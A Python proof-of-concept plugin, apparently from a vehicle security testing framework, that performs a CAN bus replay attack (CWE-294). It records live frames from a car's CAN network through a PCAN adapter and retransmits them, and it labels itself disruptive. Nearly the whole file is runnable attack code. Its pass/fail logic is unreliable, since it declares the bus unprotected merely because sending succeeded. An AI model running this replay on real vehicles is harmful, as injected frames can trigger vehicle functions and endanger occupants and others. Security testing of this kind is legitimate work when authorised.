#!/usr/bin/env python3
"""
PoC Name: CAN Replay Attack
Identifier: CWE-294
Component: CAN Bus (PCAN)
Category: Protocol
Severity: High
CVSS: 7.0
Description: 录制CAN总线消息并重放,验证是否缺少序列号/时间戳保护。
Prerequisites: PCAN接口, python-can库, PCAN驱动。
Usage: python3 04_CWE_294_CAN_Replay_Attack_Active_Validation.py PCAN_USBBUS1
"""
from __future__ import annotations

import sys
import time
from iv_plugin_base import IVIVulnerabilityPlugin
from can_bus_utils import format_can_settings, get_can_settings, open_can_bus


# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['SocketCAN 适配器（PEAK PCAN-USB / Kvaser Leaf Light / canable）', 'OBD-II 转 DB9 线缆'],
    "connection": 'SocketCAN (can0 / vcan0)',
    "tools":      ['python-can', 'cantools', 'socketcand'],
    "firmware":   'N/A（协议层攻击，不依赖特定固件版本）',
    "setup":      'ip link set can0 up type can bitrate 500000',
}

class CANReplayPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-CAN-004"
    meta_poc_name = 'CWE-294 CAN 重放 Attack Active Validation'
    meta_cve_id = "CWE-294"
    meta_source_url = "https://cwe.mitre.org/data/definitions/294.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/294.html']
    meta_severity = "High"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    meta_profiles         = ["can_gateway"]
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"检查CAN接口: {format_can_settings(settings)}")
        return True

    def exploit(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"CAN重放攻击测试 ({format_can_settings(settings)})...")
        try:
            import can
            bus = open_can_bus(self.params)
            # Phase 1: Record
            self.logger.info("Phase 1: 录制CAN帧 (3秒)...")
            recorded = []
            start = time.time()
            while time.time() - start < 3:
                msg = bus.recv(timeout=0.5)
                if msg:
                    recorded.append(msg)
            self.logger.info(f"录制 {len(recorded)} 帧")
            if len(recorded) == 0:
                self.logger.info("无CAN流量可录制")
                self.results["vulnerable"] = False
                bus.shutdown()
                return self.results
            # Phase 2: Replay
            self.logger.info(f"Phase 2: 重放 {len(recorded)} 帧...")
            for msg in recorded:
                replay = can.Message(
                    arbitration_id=msg.arbitration_id,
                    data=msg.data,
                    is_extended_id=msg.is_extended_id
                )
                bus.send(replay)
            self.logger.warning("[+] 重放完成。CAN总线未对重放帧进行过滤")
            self.results["vulnerable"] = True
            self.results["evidence"] = f"Replayed {len(recorded)} frames without rejection"
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"CAN重放失败: {e}")
            self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 04_CWE_294_CAN_Replay_Attack_Active_Validation.py <can_interface>")
        sys.exit(1)
    plugin = CANReplayPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
    plugin.run_verify()
